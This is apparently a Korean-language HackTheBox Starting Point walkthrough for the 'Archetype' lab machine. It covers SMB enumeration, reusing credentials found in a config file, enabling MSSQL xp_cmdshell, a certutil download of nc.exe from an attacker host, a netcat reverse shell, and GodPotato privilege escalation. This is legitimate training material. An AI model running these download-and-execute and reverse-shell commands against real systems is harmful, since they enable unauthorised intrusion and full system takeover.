# Archetype - HackTheBox StartingPoint
## Recon
```bash
sudo nmap -p 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 -sC -sV -vv -oA Archetype 10.129.9.99
```
<img width="935" height="275" alt="image" src="https://github.com/user-attachments/assets/dc94c8e7-962a-49ee-971d-85d58311f839" />
<img width="935" height="256" alt="image" src="https://github.com/user-attachments/assets/814684f2-8632-40df-9d25-e69ac69609ef" />

- SMB(445)
- MSSQL(1433)
- WINRM(5985)
---
## SMB
- guest로 enumeration이 가능.
- backups 폴더를 읽을 수 있는 권한 확인.
```bash
smbmap -u 'guest' -p '' -H 10.129.9.99
```
<img width="939" height="145" alt="image" src="https://github.com/user-attachments/assets/c808d4ff-8b4b-4097-89f1-593e74be142e" />

<br>
<br>

- SMB에 접속하여 내부 파일 다운로드
```bash
smbclient //10.129.9.99/backups -U guest
```
<img width="1068" height="287" alt="image" src="https://github.com/user-attachments/assets/ae84da86-0424-4edb-ad83-d1d4cc29c862" />

---
## MSSQL
- `prod.dtsConfig`의 내용을 확인하여 계정 획득
- `sql_svc:M3g4c0rp123`
<img width="1106" height="255" alt="image" src="https://github.com/user-attachments/assets/9cbf6737-9e13-465b-ac94-a1a9aab86a2b" />

<br>
<br>

- 해당 계정으로 어떤 서비스를 이용 가능한지 테스트
- mssql 관리자 권한인 것을 확인.
```bash
netexec smb 10.129.9.99 -u sql_svc -p M3g4c0rp123

netexec winrm 10.129.9.99 -u sql_svc -p M3g4c0rp123

netexec mssql 10.129.9.99 -u sql_svc -p M3g4c0rp123
```
<img width="1106" height="399" alt="image" src="https://github.com/user-attachments/assets/cce6e3df-7a95-4c00-b628-3f8c58d3dbd2" />

<br>
<br>

- mssql 접속
```bash
impacket-mssqlclient sql_svc:M3g4c0rp123@10.129.9.99 -windows-auth
```
<img width="1106" height="253" alt="image" src="https://github.com/user-attachments/assets/9ea9a4c3-ef91-4db4-9e46-5ac4d3c26f80" />

<br>
<br>

- `xp_cmdshell`을 활성화해서 시스템 명령을 수행할 수 있도록 재구성.
```mssql
EXECUTE sp_configure 'show advanced options', 1

RECONFIGURE

EXECUTE sp_configure 'xp_cmdshell', 1

RECONFIGURE

EXECUTE xp_cmdshell ‘whoami’
```
<img width="1106" height="239" alt="image" src="https://github.com/user-attachments/assets/238eb2ba-7a02-48a3-856a-f47b582fb8fb" />

<br>
<br>

- `c:\temp`폴더를 만들어 `nc.exe`를 다운받아서 reverse shell 연결 시도.
```mssql
execute xp_cmdshell 'mkdir c:\temp'

execute xp_cmdshell 'certutil -urlcache -f -split http://10.10.14.240/nc.exe c:\temp\nc.exe'
 
execute xp_cmdshell 'c:\temp\nc.exe 10.10.14.240 80 -e cmd.exe'
```
<img width="1106" height="473" alt="image" src="https://github.com/user-attachments/assets/f418780e-f038-40d6-9edd-4ac322686bbf" />

<br>
<br>

- shell 획득
<img width="1106" height="400" alt="image" src="https://github.com/user-attachments/assets/35a94c1c-5ef0-4b24-82dd-b05e2872e7ab" />

---
## Privesc
### SeImpersonate
- https://github.com/BeichenDream/GodPotato
```powershell
whoami /all
```
<img width="1106" height="238" alt="image" src="https://github.com/user-attachments/assets/8d55b007-5517-4843-a488-2773e35d101d" />

<br>
<br>

```powershell
certutil -urlcache -f -split http://10.10.14.240/godpotato.exe

.\godpotato.exe -cmd "c:\temp\nc.exe 10.10.14.240 80 -e cmd.exe"
```
<img width="1106" height="517" alt="image" src="https://github.com/user-attachments/assets/bc4a12b3-2496-4887-8ab7-8cafe96dc60f" />

<br>
<br>

- shell 획득(nt authority\system)
<img width="1106" height="238" alt="image" src="https://github.com/user-attachments/assets/c50c947d-bf0b-4a8d-99ad-bf2247fc86b0" />

### Powershell History
```cmd
powershell -ep bypass
```
```powershell
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

Test-Path $historyPath

Get-Content $historyPath
```
<img width="1106" height="173" alt="image" src="https://github.com/user-attachments/assets/f739f777-2dee-4886-b72c-b13d3f176c4d" />

---
## flag
- `c:\users\sql_svc\desktop`
<img width="1106" height="244" alt="image" src="https://github.com/user-attachments/assets/2cbe7038-161c-474d-bf9c-6150f3dd0dd3" />

<br>
<br>

- `c:\users\administrator\deskop`
<img width="1106" height="244" alt="image" src="https://github.com/user-attachments/assets/08bb407b-661a-4aee-87d9-fc6c9bd3f36e" />





